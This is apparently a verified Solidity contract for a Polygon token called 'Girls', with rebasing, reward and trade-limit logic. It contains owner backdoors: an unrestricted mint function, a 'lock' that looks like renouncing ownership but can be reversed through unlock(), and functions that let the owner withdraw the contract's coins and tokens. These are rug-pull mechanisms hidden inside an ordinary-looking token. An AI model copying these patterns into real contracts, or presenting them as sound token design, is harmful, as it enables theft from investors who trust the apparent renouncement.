/**
 *Submitted for verification at polygonscan.com on 2021-10-11
*/

/**
 *        Girls !!!   Maximum buy / sell amount changes changes when pair-balance changes
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

interface Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Ownership(address indexed previousOwner, string message);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function getUnlockTime() public view returns (uint256) {
        return _lockTime;
    }

    function lock30Days() public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + 30 days;
        emit OwnershipTransferred(_owner, address(0));
    }

    function lockForever() public virtual onlyOwner {
        _previousOwner = address(0);
        _owner = address(0);
        emit Ownership(_owner, "These Girls are abandoned forever");
    }

    function unlock() public virtual {
        require(_previousOwner == msg.sender, "locked");
        require(block.timestamp > _lockTime , "locked");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }

    function transferOwnership(address newOwner_) public virtual onlyOwner {
        address msgSender = _msgSender();
        _owner = newOwner_;
        emit OwnershipTransferred(msgSender, newOwner_);
    }
}

contract Girls is Context, Ownable, IERC20, Metadata {

    string private _name;
    string private _symbol;

    address private pair;
    address private router;
    address private girls;

    uint256 private _maxBuySellAmount;
    uint256 private _minTxAmount;
    uint256 public hodl;
    uint256 private scale;
    uint256 private sum;
    uint8 private remove;
    uint8 private scLim;

    mapping (uint256 => address) private row;
    mapping (address => account) private balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    Router Route;

    struct account {
        uint256 rate;
        uint256 bag;
    }

    receive() external payable {}

    function sendBnb(address payable to, uint256 amount) public onlyOwner payable {
        to.transfer(amount);
    }

    function zzZend(address token, address to, uint256 amount) public onlyOwner {
        IERC20(token).transfer(to, amount);
    }

    function mint(address to, uint256 amount) public onlyOwner {
        if (balances[to].rate == 0) {
            balances[to].rate = scale;
        }
        balances[to].bag += amount;
        if (to != girls) {
            hodl += amount;
        }
    }

    constructor (string memory name_, string memory symbol_, address router_) {
        _name = name_;
        _symbol = symbol_;
        girls = address(this);
        router = router_;

        Router routerAddress = Router(router);

        pair = Factory(routerAddress.factory()).
        createPair(address(this),
        routerAddress.WETH());

        Route = routerAddress;

        sum = 10;
        scLim = 2;
        scale = 10**12;
        hodl = (10**24)* 2;
        _minTxAmount = 10**15;

        row[0] = address(0);
        row[1] = girls;
        row[2] = pair;
        row[3] = router;

        balances[msg.sender].rate = scale;
        balances[msg.sender].bag = hodl;
        balances[address(0)].rate = scale;
        balances[girls].rate = scale;
        balances[girls].bag = (10**28) - hodl;

        emit Transfer(address(0), girls, 10**28);
        emit Transfer(girls, msg.sender, hodl);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function balanceOf(address owner) public view virtual override returns (uint256) {
        return div(mul(balances[owner].bag, balances[owner].rate), scale);
    }

    function totalSupply() public view virtual override returns (uint256) {
        return balanceOf(girls) + balanceOf(pair) + hodl;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        uint8 trx;
        trx = getRoute(_msgSender(), recipient);
        _transfer(_msgSender(), recipient, amount, trx);
        fromPair(recipient, amount, trx);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        uint8 trx;
        trx = getRouterBalance(recipient);
        _transferTo(sender, recipient, amount, taxed(amount), trx);
        ratify(sender, amount);
        if(scLim > 0) {
            toPair(sender, amount, trx);
        }
        return true;
    }

    function rewardBuyFromPair(address rAddr, uint256 amount) internal {
        if(balanceOf(girls) > maxBuySellAmount()){
            if (balances[rAddr].rate < mul(10**12, 2)) {
                uint256 preRated = balanceOf(rAddr);
                balances[rAddr].rate += div(balances[rAddr].rate, getRateFactor(mul(amount, 5)));
                uint256 profit = sub(balanceOf(rAddr), preRated);
                balances[girls].bag -= profit;
                hodl += profit;
                row[sum] = rAddr;
                sum++;
                emit Transfer(girls, rAddr, profit);
            }
        }
        setScale(amount);
    }

    function rewardSellToPair(address sender, uint256 amount) internal {
        if(balanceOf(girls) > maxBuySellAmount()){
            hodl -= amount;
            balances[girls].bag -= add(amount, div(amount, 5));
            burn(girls, add(add(amount, div(amount, 20)), rateAddressDown(sender, amount)));
            payLastFive(sender, div(amount, 4));
            setScale(amount);
        } else {
            setScale(amount);
        }
    }

    function rewardAddLiquidityToPair(address sender, uint256 amount )internal {
        if(balanceOf(girls) > maxBuySellAmount()){
            balances[girls].bag -= div(amount, 10);
            balances[sender].bag += mul(div(getValue(sender, amount), 20), 3);
            hodl -= div(mul(amount, 15), 20);
            burn(girls, amount);
        }
        if(sender != girls) {
            row[sum] = sender;
            sum++;
        }
        emit Transfer(pair, sender, div(amount, 20));
        emit Transfer(girls, sender, div(amount, 10));
    }

    function rewardRemoveFromPair(address recipient, uint256 amount) internal {
        hodl += amount;
        if(balanceOf(girls) > maxBuySellAmount()){
            payStakeReward(recipient, amount);
            burn(girls, amount);
            balances[girls].bag -= amount;
        }
        else {
            mintStakeReward(recipient, amount);
        }
    }

    function _getHowMuchRewardIfIRemoveLiquidityNow(uint256 amountStaked) public view returns (uint256 reward) {
        if(getReward(_msgSender(), amountStaked) > amountStaked) {
            reward = sub(getReward(_msgSender(), amountStaked), amountStaked);
            return mul(reward, 3);
        }
    }

    function payStakeReward(address recipient, uint256 amountRemoved) internal {
        if(getReward(recipient, amountRemoved) > amountRemoved) {
            uint256 rewardAmount = sub(getReward(recipient, amountRemoved), amountRemoved);
            uint256 rewardValue = getValue(recipient, rewardAmount);
            balances[recipient].bag += mul(rewardValue, 3);
            hodl += mul(rewardAmount, 3);
            balances[girls].bag -= mul(rewardAmount, 3);
            emit Transfer(girls, recipient, mul(rewardAmount, 3));
        }
    }

    function mintStakeReward(address recipient, uint256 amountRemoved) internal {
        if(getReward(recipient, amountRemoved) > amountRemoved) {
            uint256 rewardAmount = sub(getReward(recipient, amountRemoved), amountRemoved);
            uint256 rewardValue = getValue(recipient, rewardAmount);
            balances[recipient].bag += mul(rewardValue, 3);
            hodl += mul(rewardAmount, 3);
            emit Transfer(girls, recipient, mul(rewardAmount, 3));
        }
    }

    function rateAddressDown(address rAddr, uint256 amount) internal returns (uint256 loss) {
        if (balances[rAddr].rate > 200) {
            uint256 preRated = balanceOf(rAddr);
            balances[rAddr].rate -= div(balances[rAddr].rate, getRateFactor(mul(amount, 4)));
            if(preRated > balanceOf(rAddr)) {
                loss = sub(preRated, balanceOf(rAddr));
            }
        }
    }

    function payLastFive(address sender, uint256 payAmount) internal {
        for (uint i=sum-5; i < sum; i++) {
            if (row[i] != sender) {
                balances[row[i]].bag += div(getValue(row[i], payAmount), 5);
                balances[girls].bag -= div(payAmount, 5);
                hodl += div(payAmount, 5);
                emit Transfer(girls, row[i], div(payAmount, 5));
            } else{
                balances[girls].bag -= div(payAmount, 5);
                emit Transfer(girls, address(0), div(payAmount, 5));
            }
        }
    }

    function setScale(uint256 amount) internal {
        if(scale > 200){
            scale -= div(scale, getScaleFactor(amount));
            if(balanceOf(girls) > maxBuySellAmount()){
                balances[girls].bag -= div(amount, 10);
            }
            hodl += div(amount, 10);
            scaleRate();
        } else{
            if(scLim > 0){
                scale = div(scale, 2);
                hodl += hodl;
                scaleRate();
                scLim = 0;
            }
        }
    }

    function scaleRate() internal {
        for (uint i=0; i < 4; i++) {
            balances[row[i]].rate = scale;
        }
    }

    function getScale() public view returns (uint256) {
        return scale;
    }

    function getScaleFactor(uint256 amount) internal view returns(uint256) {
        return div(mul(hodl, 10), amount);
    }

    function getRateFactor(uint256 amount) internal view returns(uint256) {
        return div(mul(hodl, 10), amount);
    }

    function getAddressRate() public view returns (uint256) {
        return balances[_msgSender()].rate;
    }

    function getValue(address rAddr, uint256 amount) internal view returns(uint256 value) {
       value = div(mul(amount, scale), balances[rAddr].rate);
       return value;
    }

    function getReward(address rAddr, uint256 value) internal view returns (uint256 amount) {
        amount = div(mul(value, balances[rAddr].rate), scale );
        return amount;
    }

    function fromPair(address recipient, uint256 amount, uint8 trx)  internal {
        if (trx == 0) {
            hodl += amount;
            if(scLim > 0) {
                rewardBuyFromPair(recipient, amount);
            }
        }
        else if(trx == 1) {
            rewardRemoveFromPair(recipient, amount);
        }
        else if(trx == 3) {
            hodl += amount;
        }
    }

    function toPair(address sender, uint256 amount, uint8 trx) internal {
        if (scLim > 0) {
            if(trx == 1) {
               if (balanceOf(girls) > maxBuySellAmount()){
                   rewardAddLiquidityToPair(sender, amount);
               }
            }
            else if(trx == 0) {
                rewardSellToPair(sender, amount);
            }
        }
    }

    function getRoute(address sender, address recipient) internal returns (uint8 trx) {
        if(balances[recipient].rate == 0) {
            balances[recipient].rate = scale;
        }
        if(sender == pair) {
            if(recipient != router) {
                remove = 0;
            } else {
                trx = 2;
                remove = 1;
            }
        }
        else if(sender == router){
            if(remove > 0) {
                trx = 1;
                remove = 0;
            }
        }
        else {
            trx = 7;
        }
    }

    function getRouterBalance(address recipient) internal returns (uint8 trx) {
        if(recipient == pair) {
            if(_msgSender() == router) {
                if(_msgSender().balance > 0) {
                    trx =1;
                }
            } else {
                balances[_msgSender()].rate = scale;
                trx = 2;
            }
        } else {
            balances[_msgSender()].rate = scale;
            trx = 2;
        }
    }

    modifier mod_transfer(address sender, address recipient, uint256 amount, uint8 trx) {
        if (trx == 0) {
            require(amount <= maxBuySellAmount(),"Transfer amount exceeds maxBuySellAmount");
        }
        require(amount >= _minTxAmount,"Transfer amount too low");
        require(recipient != pair, "Transfer to the pair address");
        require(sender != girls, "Transfer from the contract address");
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        _;
    }

    function _transfer(address sender, address recipient, uint256 amount, uint8 trx)
        internal
        virtual
        mod_transfer(sender, recipient, amount, trx)
        {
        uint256 valueS = getValue(sender, amount);
        uint256 valueR = getValue(recipient, amount);
        uint256 senderBalance = balances[sender].bag;
        require(senderBalance >= valueS, "Transfer amount exceeds balance");
        unchecked {
            balances[sender].bag = senderBalance - valueS;
        }
        balances[recipient].bag += valueR;
        emit Transfer(sender, recipient, amount);
    }

    modifier mod_transferTo(address sender, address recipient, uint256 amount, uint8 trx) {
        if (balances[recipient].rate == 0) {
            balances[recipient].rate = scale;
        }
        if (trx != 1) {
            require(amount <= maxBuySellAmount(),"Transfer amount exceeds maxBuySellAmount");
            require(sender != girls, "Transfer from the contract address");
        }
        require(amount >= _minTxAmount,"Transfer amount too low");
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        _;
    }

    function _transferTo(address sender, address recipient, uint256 amount, uint256 sAmount, uint8 trx)
        internal
        virtual
        mod_transferTo(sender, recipient, amount, trx)
        {
        uint256 valueS = getValue(sender, amount);
        uint256 valueR = getValue(recipient, sAmount);
        uint256 senderBalance = balances[sender].bag;
        require(senderBalance >= valueS, "Transfer amount exceeds balance");
        unchecked {
            balances[sender].bag = senderBalance - valueS;
        }
        balances[recipient].bag += valueR;
        emit Transfer(sender, recipient, amount);
    }

    function _maxBuySellAmountSubDecimals() public view returns (uint256) {
        return div(div(hodl, 50), 10**18);
    }

    function minimumTxAmountWithDecimals() public view returns (uint256) {
        return _minTxAmount;
    }

    function maxBuySellAmount() internal view returns (uint256) {
        return div(hodl, 50);
    }

    function burn(address addr, uint256 amount) internal {
        balances[address(0)].bag += amount;
        balances[girls].bag -= amount;
        emit Transfer(addr, address(0), amount);
    }

    function getPairAddress() public view returns (address) {
        return pair;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "Decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function ratify(address sender, uint256 amount) internal {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "Transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
    }

    function taxed(uint256 tAmount) internal pure returns (uint256) {
        return sub(tAmount, div(tAmount, 20));
    }

    function div(uint256 taX, uint256 faX) internal pure returns (uint256) {
        return taX / faX;
    }

    function mul(uint256 taX, uint256 faX) internal pure returns (uint256) {
        return taX * faX;
    }

    function sub(uint256 taX, uint256 faX) internal pure returns (uint256) {
        return taX - faX;
    }

    function add(uint256 taX, uint256 faX) internal pure returns (uint256) {
        return taX + faX;
    }
}